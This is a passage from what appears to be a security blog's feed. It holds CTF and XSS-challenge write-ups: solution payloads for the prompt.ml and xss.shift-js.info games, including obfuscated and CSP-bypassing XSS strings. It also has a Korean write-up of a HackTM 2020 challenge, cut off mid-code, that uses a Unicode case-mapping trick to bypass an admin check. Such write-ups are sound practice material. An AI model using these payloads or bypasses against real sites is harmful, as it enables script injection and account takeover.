        <content type="html"><![CDATA[<blockquote><p>This is a XSS injection game inspired by <a href="http://escape.alf.nu/" target="_blank" rel="noopener">alert(1) to win</a>.</p><p><a href="http://prompt.ml/" target="_blank" rel="noopener">http://prompt.ml/</a></p></blockquote><h2 id="0x0"><a href="#0x0" class="headerlink" title="0x0"></a>0x0</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;autofocus&#x2F;onfocus&#x3D;&quot;prompt(1)</span><br></pre></td></tr></table></figure><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src onerror&#x3D;prompt(1) \</span><br></pre></td></tr></table></figure><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;Set.constructor&#96;prompt\x281\x29&#96;&#96;&#96;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;img src onerror&#x3D;prompt(1)</span><br></pre></td></tr></table></figure><h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;prompt.ml%2f@14.rs</span><br></pre></td></tr></table></figure><h2 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; type&#x3D;image src onerror</span><br><span class="line">&#x3D;&quot;prompt(1)</span><br></pre></td></tr></table></figure><h2 id="0x6"><a href="#0x6" class="headerlink" title="0x6"></a>0x6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;&quot;action&quot;:&quot;z&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="0x7"><a href="#0x7" class="headerlink" title="0x7"></a>0x7</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;&#96;#&#96;;prompt(1)&#96;#&#96;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="0x8"><a href="#0x8" class="headerlink" title="0x8"></a>0x8</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[U+2028]prompt(1)[U+2028]--&gt;</span><br></pre></td></tr></table></figure><h2 id="0x9"><a href="#0x9" class="headerlink" title="0x9"></a>0x9</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ımg src onerror&#x3D;[][&quot;\146\151\154\164\145\162&quot;][&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;](&quot;\160\162\157\155\160\164\50\61\51&quot;)()&gt;</span><br></pre></td></tr></table></figure><h2 id="0xA"><a href="#0xA" class="headerlink" title="0xA"></a>0xA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;(prompt(1))in&quot;</span><br></pre></td></tr></table></figure><h2 id="0xB"><a href="#0xB" class="headerlink" title="0xB"></a>0xB</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;in (prompt(1))in&quot;</span><br></pre></td></tr></table></figure><h2 id="0xC"><a href="#0xC" class="headerlink" title="0xC"></a>0xC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval((1558153217).toString(36).concat(String.fromCharCode(40).concat(1).concat(String.fromCharCode(41))))</span><br></pre></td></tr></table></figure><h2 id="0xD"><a href="#0xD" class="headerlink" title="0xD"></a>0xD</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;source&quot;:&quot;$&#39;&lt;svg&#x2F;onload&#x3D;prompt(1)&#x2F;&#x2F;&quot;&#125;,&quot;source&quot;:&quot;z*&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="0xE"><a href="#0xE" class="headerlink" title="0xE"></a>0xE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;&#96;#&#96;;prompt(1)&#96;#&#96;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss.shift-js.info Solution</title>
      <link href="/xss-shift-js-solution/"/>
      <url>/xss-shift-js-solution/</url>
      
        <content type="html"><![CDATA[<blockquote><p>XSS Challenge</p><p><a href="http://xss.shift-js.info/" target="_blank" rel="noopener">http://xss.shift-js.info/</a></p></blockquote><h2 id="1-Simple-XSS-1"><a href="#1-Simple-XSS-1" class="headerlink" title="1. Simple XSS 1"></a><a href="http://xss.shift-js.info/case01.php?payload=[XSS]" target="_blank" rel="noopener">1. Simple XSS 1</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case01.php?payload&#x3D;%3Csvg&#x2F;onload&#x3D;alert(%27XSS%27)%3E</span><br></pre></td></tr></table></figure><h2 id="2-Simple-XSS-2"><a href="#2-Simple-XSS-2" class="headerlink" title="2. Simple XSS 2"></a><a href="http://xss.shift-js.info/case02.php" target="_blank" rel="noopener">2. Simple XSS 2</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case02.php#%3Ciframe&#x2F;onload&#x3D;alert(&#39;XSS&#39;)%3E</span><br></pre></td></tr></table></figure><h2 id="3-With-htmlspecialchars"><a href="#3-With-htmlspecialchars" class="headerlink" title="3. With htmlspecialchars()"></a><a href="http://xss.shift-js.info/case03.php?payload=[XSS]" target="_blank" rel="noopener">3. With htmlspecialchars()</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case03.php?payload&#x3D;javascript:alert(%27XSS%27)</span><br></pre></td></tr></table></figure><h2 id="4-1-Without-any-backquotes-and-HTML-tags"><a href="#4-1-Without-any-backquotes-and-HTML-tags" class="headerlink" title="4-1. Without any backquotes and HTML tags"></a><a href="http://xss.shift-js.info/case04-1.php?payload=[XSS]" target="_blank" rel="noopener">4-1. Without any backquotes and HTML tags</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case04-1.php?payload&#x3D;$&#123;alert(%27XSS%27)&#125;</span><br></pre></td></tr></table></figure><h2 id="4-2-Without-any-backquotes-HTML-tags-and-ux"><a href="#4-2-Without-any-backquotes-HTML-tags-and-ux" class="headerlink" title="4-2. Without any backquotes, HTML tags and [ux]"></a><a href="http://xss.shift-js.info/case04-2.php?payload=[XSS]" target="_blank" rel="noopener">4-2. Without any backquotes, HTML tags and [ux]</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case04-2.php?payload&#x3D;$&#123;alert(%27XSS%27)&#125;</span><br></pre></td></tr></table></figure><h2 id="5-Without-any-alphabets"><a href="#5-Without-any-alphabets" class="headerlink" title="5. Without any alphabets"></a><a href="http://xss.shift-js.info/case05.php?payload=[XSS]" target="_blank" rel="noopener">5. Without any alphabets</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case05.php?payload&#x3D;%24%3D~%5B%5D%3B%24%3D%7B___%3A%2B%2B%24%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5B%24%5D%2C__%24%3A%2B%2B%24%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5B%24%5D%2C_%24_%3A%2B%2B%24%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5B%24%5D%2C%24%24_%24%3A(%24%5B%24%5D%2B%22%22)%5B%24%5D%2C_%24%24%3A%2B%2B%24%2C%24%24%24_%3A(!%22%22%2B%22%22)%5B%24%5D%2C%24__%3A%2B%2B%24%2C%24_%24%3A%2B%2B%24%2C%24%24__%3A(%7B%7D%2B%22%22)%5B%24%5D%2C%24%24_%3A%2B%2B%24%2C%24%24%24%3A%2B%2B%24%2C%24___%3A%2B%2B%24%2C%24__%24%3A%2B%2B%24%7D%3B%24.%24_%3D(%24.%24_%3D%24%2B%22%22)%5B%24.%24_%24%5D%2B(%24._%24%3D%24.%24_%5B%24.__%24%5D)%2B(%24.%24%24%3D(%24.%24%2B%22%22)%5B%24.__%24%5D)%2B((!%24)%2B%22%22)%5B%24._%24%24%5D%2B(%24.__%3D%24.%24_%5B%24.%24%24_%5D)%2B(%24.%24%3D(!%22%22%2B%22%22)%5B%24.__%24%5D)%2B(%24._%3D(!%22%22%2B%22%22)%5B%24._%24_%5D)%2B%24.%24_%5B%24.%24_%24%5D%2B%24.__%2B%24._%24%2B%24.%24%3B%24.%24%24%3D%24.%24%2B(!%22%22%2B%22%22)%5B%24._%24%24%5D%2B%24.__%2B%24._%2B%24.%24%2B%24.%24%24%3B%24.%24%3D(%24.___)%5B%24.%24_%5D%5B%24.%24_%5D%3B%24.%24(%24.%24(%24.%24%24%2B%22%5C%22%22%2B%24.%24_%24_%2B(!%5B%5D%2B%22%22)%5B%24._%24_%5D%2B%24.%24%24%24_%2B%22%5C%5C%22%2B%24.__%24%2B%24.%24%24_%2B%24._%24_%2B%24.__%2B%22(%27%5C%5C%22%2B%24.__%24%2B%24._%24%24%2B%24.___%2B%22%5C%5C%22%2B%24.__%24%2B%24._%24_%2B%24._%24%24%2B%22%5C%5C%22%2B%24.__%24%2B%24._%24_%2B%24._%24%24%2B%22%27)%22%2B%22%5C%22%22)())()%3B</span><br></pre></td></tr></table></figure><h2 id="6-1-Without-any-paretheses"><a href="#6-1-Without-any-paretheses" class="headerlink" title="6-1. Without any paretheses"></a><a href="http://xss.shift-js.info/case06-1.php?payload=[XSS]" target="_blank" rel="noopener">6-1. Without any paretheses</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case06-1.php?payload&#x3D;%3Csvg&#x2F;onload&#x3D;alert&#96;XSS&#96;%3E</span><br></pre></td></tr></table></figure><h2 id="6-2-Without-any-parentheses-and-oO-nN"><a href="#6-2-Without-any-parentheses-and-oO-nN" class="headerlink" title="6-2. Without any parentheses and [oO][nN]"></a><a href="http://xss.shift-js.info/case06-2.php?payload=[XSS]" target="_blank" rel="noopener">6-2. Without any parentheses and [oO][nN]</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case06-2.php?payload&#x3D;%3Cscript%3Ealert&#96;XSS&#96;%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><h2 id="6-3-Without-any-paretheses-and-oO-nN"><a href="#6-3-Without-any-paretheses-and-oO-nN" class="headerlink" title="6-3. Without any paretheses and .[oO].[nN].*"></a><a href="http://xss.shift-js.info/case06-3.php?payload=[XSS]" target="_blank" rel="noopener">6-3. Without any paretheses and .<em>[oO].</em>[nN].*</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case06-3.php?payload&#x3D;%3Cscript%3Ealert&#96;XSS&#96;%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><h2 id="6-4-Without-any-paretheses-oO-nN-and-tag-attributes"><a href="#6-4-Without-any-paretheses-oO-nN-and-tag-attributes" class="headerlink" title="6-4. Without any paretheses, .[oO].[nN].* and tag attributes"></a><a href="http://xss.shift-js.info/case06-4.php?payload=[XSS]" target="_blank" rel="noopener">6-4. Without any paretheses, .<em>[oO].</em>[nN].* and tag attributes</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case06-4.php?payload&#x3D;%3Ciframe&#x2F;src&#x3D;javascript:alert&#96;XSS&#96;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="7-1-Without-any-quotes"><a href="#7-1-Without-any-quotes" class="headerlink" title="7-1. Without any quotes"></a><a href="http://xss.shift-js.info/case07-1.php?payload=[XSS]" target="_blank" rel="noopener">7-1. Without any quotes</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case07-1.php?payload&#x3D;%3Csvg&#x2F;onload&#x3D;alert(&#x2F;XSS&#x2F;.source)%3E</span><br></pre></td></tr></table></figure><h2 id="7-2-Without-any-quotes-and-amp"><a href="#7-2-Without-any-quotes-and-amp" class="headerlink" title="7-2. Without any quotes and &amp;#"></a><a href="http://xss.shift-js.info/case07-2.php?payload=[XSS]" target="_blank" rel="noopener">7-2. Without any quotes and &amp;#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case07-2.php?payload&#x3D;%3Csvg&#x2F;onload&#x3D;alert(&#x2F;XSS&#x2F;.source)%3E</span><br></pre></td></tr></table></figure><h2 id="8-1-Without-any-backquotes-parentheses-and-HTML-tags"><a href="#8-1-Without-any-backquotes-parentheses-and-HTML-tags" class="headerlink" title="8-1. Without any backquotes, parentheses and HTML tags"></a><a href="http://xss.shift-js.info/case08-1.php?payload=[XSS]" target="_blank" rel="noopener">8-1. Without any backquotes, parentheses and HTML tags</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case08-1.php?payload&#x3D;%22%0aalert(%22XSS%22)&#x2F;&#x2F;onmouseover&#x3D;%27javascript:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="8-2-Without-any-backquotes-parentheses-HTML-tags-and-amp"><a href="#8-2-Without-any-backquotes-parentheses-HTML-tags-and-amp" class="headerlink" title="8-2. Without any backquotes, parentheses, HTML tags and &amp;#"></a><a href="http://xss.shift-js.info/case08-2.php?payload=[XSS]" target="_blank" rel="noopener">8-2. Without any backquotes, parentheses, HTML tags and &amp;#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case08-2.php?payload&#x3D;%22%0aalert(%22XSS%22)&#x2F;&#x2F;onmouseover&#x3D;%27javascript:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="9-1-Without-any-spaces-and-script"><a href="#9-1-Without-any-spaces-and-script" class="headerlink" title="9-1. Without any spaces and script"></a><a href="http://xss.shift-js.info/case09-1.php?payload=[XSS]" target="_blank" rel="noopener">9-1. Without any spaces and script</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case09-1.php?payload&#x3D;%3Csvg&#x2F;onload&#x3D;alert(%27XSS%27)%3E</span><br></pre></td></tr></table></figure><h2 id="9-2-Without-any-spaces-and-sS-cC-rR-iI-pP-tT"><a href="#9-2-Without-any-spaces-and-sS-cC-rR-iI-pP-tT" class="headerlink" title="9-2. Without any spaces and [sS][cC][rR][iI][pP][tT]"></a><a href="http://xss.shift-js.info/case09-2.php?payload=[XSS]" target="_blank" rel="noopener">9-2. Without any spaces and [sS][cC][rR][iI][pP][tT]</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case09-2.php?payload&#x3D;%3Cx&#x2F;onmouseover&#x3D;alert(%22XSS%22)%3E</span><br></pre></td></tr></table></figure><h2 id="20-Bad-use-of-JSONP"><a href="#20-Bad-use-of-JSONP" class="headerlink" title="20. Bad use of JSONP"></a><a href="http://xss.shift-js.info/case20.php?payload=[XSS]" target="_blank" rel="noopener">20. Bad use of JSONP</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case20.php?payload&#x3D;%3Cscript&#x2F;src&#x3D;jsonp.php?callback&#x3D;alert(%27XSS%27)%3E%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><h2 id="21-nonce-unsafe-eval"><a href="#21-nonce-unsafe-eval" class="headerlink" title="21. nonce + unsafe-eval"></a><a href="http://xss.shift-js.info/case21.php?payload=[XSS]" target="_blank" rel="noopener">21. nonce + unsafe-eval</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case21.php?payload&#x3D;%3Cinput&#x2F;id&#x3D;%22equation%22value&#x3D;alert(%27XSS%27)%3E%3C!--</span><br></pre></td></tr></table></figure><h2 id="22-nonce-unsafe-eval"><a href="#22-nonce-unsafe-eval" class="headerlink" title="22. nonce + unsafe-eval"></a><a href="http://xss.shift-js.info/case22.php?payload=[XSS]" target="_blank" rel="noopener">22. nonce + unsafe-eval</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case22.php?payload&#x3D;&#123;&#123;constructor.constructor(%22alert(%27XSS%27)%22)()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="23-nonce-strict-dynamic"><a href="#23-nonce-strict-dynamic" class="headerlink" title="23. nonce + strict-dynamic"></a><a href="http://xss.shift-js.info/case23.php?payload=[XSS]" target="_blank" rel="noopener">23. nonce + strict-dynamic</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss.shift-js.info&#x2F;case23.php?payload&#x3D;alert(%27XSS%27)&#x2F;&#x2F;%3Cscript&#x2F;id&#x3D;injectarea%3E%3C&#x2F;script%3E%3C!--</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> CSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTM CTF Quals 2020</title>
      <link href="/hacktm-ctf-quals-2020/"/>
      <url>/hacktm-ctf-quals-2020/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/956" target="_blank" rel="noopener">https://ctftime.org/event/956</a></li></ul><p>WreckTheLine 팀에서 주최한 CTF 입니다.</p><h2 id="175pts-Draw-with-us-1st-solve"><a href="#175pts-Draw-with-us-1st-solve" class="headerlink" title="[175pts] Draw with us (1st solve)"></a>[175pts] <a href="#draw-with-us">Draw with us</a> (1st solve)</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/hacktm/stripped.js" target="_blank" rel="noopener">stripped.js</a></li></ul><blockquote><p>Come draw with us!<br><a href="http://167.172.165.153:60000/" target="_blank" rel="noopener">http://167.172.165.153:60000/</a><br>Author: stackola<br><strong>Hint!</strong> Changing your color is the first step towards happiness.</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidUser</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.username.length &gt;= <span class="number">3</span> &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>로그인 함수에서 <code>isValidUser</code> 함수를 호출하여 admin 계정으로의 로그인인지 확인합니다.<br><code>u.username.toUpperCase() !== config.adminUsername.toUpperCase()</code> 를 만족하지 않으면 로그인인 가능합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> u.username.toLowerCase() == config.adminUsername.toLowerCase();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>하지만 로그인 이후 관리자 페이지인 <code>/updateUser</code> 에서는 <code>isAdmin</code> 함수를 이용하여 관리자 권한을 확인하는데, 비교에 <code>String.toUpperCase</code> 를 사용하였던 <code>isValidUser</code> 와 다르게 <code>String.toLowerCase</code> 를 사용하고 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[223] ß (%C3%9F).toUpperCase() &#x3D;&gt; SS (%53%53)</span><br><span class="line">[304] İ (%C4%B0).toLowerCase() &#x3D;&gt; i̇ (%69%307)</span><br><span class="line">[305] ı (%C4%B1).toUpperCase() &#x3D;&gt; I (%49)</span><br><span class="line">[329] ŉ (%C5%89).toUpperCase() &#x3D;&gt; ʼN (%2bc%4e)</span><br><span class="line">[383] ſ (%C5%BF).toUpperCase() &#x3D;&gt; S (%53)</span><br><span class="line">[496] ǰ (%C7%B0).toUpperCase() &#x3D;&gt; J̌ (%4a%30c)</span><br><span class="line">[7830] ẖ (%E1%BA%96).toUpperCase() &#x3D;&gt; H̱ (%48%331)</span><br><span class="line">[7831] ẗ (%E1%BA%97).toUpperCase() &#x3D;&gt; T̈ (%54%308)</span><br><span class="line">[7832] ẘ (%E1%BA%98).toUpperCase() &#x3D;&gt; W̊ (%57%30a)</span><br><span class="line">[7833] ẙ (%E1%BA%99).toUpperCase() &#x3D;&gt; Y̊ (%59%30a)</span><br><span class="line">[7834] ẚ (%E1%BA%9A).toUpperCase() &#x3D;&gt; Aʾ (%41%2be)</span><br><span class="line">[8490] K (%E2%84%AA).toLowerCase() &#x3D;&gt; k (%6b)</span><br><span class="line">[64256] ﬀ (%EF%AC%80).toUpperCase() &#x3D;&gt; FF (%46%46)</span><br><span class="line">[64257] ﬁ (%EF%AC%81).toUpperCase() &#x3D;&gt; FI (%46%49)</span><br><span class="line">[64258] ﬂ (%EF%AC%82).toUpperCase() &#x3D;&gt; FL (%46%4c)</span><br><span class="line">[64259] ﬃ (%EF%AC%83).toUpperCase() &#x3D;&gt; FFI (%46%46%49)</span><br><span class="line">[64260] ﬄ (%EF%AC%84).toUpperCase() &#x3D;&gt; FFL (%46%46%4c)</span><br><span class="line">[64261] ﬅ (%EF%AC%85).toUpperCase() &#x3D;&gt; ST (%53%54)</span><br><span class="line">[64262] ﬆ (%EF%AC%86).toUpperCase() &#x3D;&gt; ST (%53%54)</span><br></pre></td></tr></table></figure><p>자바스크립트에서 <code>K(U+212a)</code> 는 <code>String.toLowerCase</code> 함수를 통해, 아스키 문자인 <code>k(0x6b)</code> 로 변환됩니다. 따라서 <code>{&quot;username&quot;:&quot;hac\u212aTm&quot;}</code> 를 파라미터로 하여 로그인하면, <code>isValidUser</code> 함수를 우회하고 관리자 페이지인 <code>/updateUser</code> 에 접근할 수 있게 됩니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">"/flag"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Get the flag</span></span><br><span class="line">  <span class="comment">// Only for root</span></span><br><span class="line">  <span class="keyword">if</span> (req.user.id == <span class="number">0</span>) &#123;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">flag</span>: flag &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.send(err(<span class="string">"Unauthorized"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>플래그를 얻기 위해서는 <code>/flag</code> 경로에 접근할 수 있어야 하는데, <code>req.user.id</code> 값을 <code>0</code> 으로 만들어야 합니다. 이 값은 <code>/init</code> 페이지에서 변경할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">"/init"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123; p = <span class="string">"0"</span>, q = <span class="string">"0"</span>, clearPIN &#125; = req.body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> target = md5(config.n.toString());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> pwHash = md5(</span><br><span class="line">    bigInt(<span class="built_in">String</span>(p))</span><br><span class="line">      .multiply(<span class="built_in">String</span>(q))</span><br><span class="line">      .toString()</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pwHash == target &amp;&amp; clearPIN === _clearPIN) &#123;</span><br><span class="line">    <span class="comment">// Clear the board</span></span><br><span class="line">    board = <span class="keyword">new</span> <span class="built_in">Array</span>(config.height)</span><br><span class="line">      .fill(<span class="number">0</span>)</span><br><span class="line">      .map(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Array</span>(config.width).fill(config.backgroundColor));</span><br><span class="line">    boardString = boardToStrings();</span><br><span class="line"></span><br><span class="line">    io.emit(<span class="string">"board"</span>, &#123; <span class="attr">board</span>: boardString &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Sign the admin ID</span></span><br><span class="line">  <span class="keyword">let</span> adminId = pwHash</span><br><span class="line">    .split(<span class="string">""</span>)</span><br><span class="line">    .map(<span class="function">(<span class="params">c, i</span>) =&gt;</span> c.charCodeAt(<span class="number">0</span>) ^ target.charCodeAt(i))</span><br><span class="line">    .reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(adminId);</span><br><span class="line"></span><br><span class="line">  res.json(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: adminId &#125;) &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>/init</code> 에서는 <code>sign</code> 함수를 통해 <code>req.users.id</code> 값을 변경할 수 있습니다.<br>그러기 위해서는 <code>pwHash</code> 값인 <code>md5(bigInt(String(p)).multiply(String(q)).toString())</code> 와 <code>target</code> 인 <code>md5(config.n.toString())</code> 값이 동일해야만 합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">"/serverInfo"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span 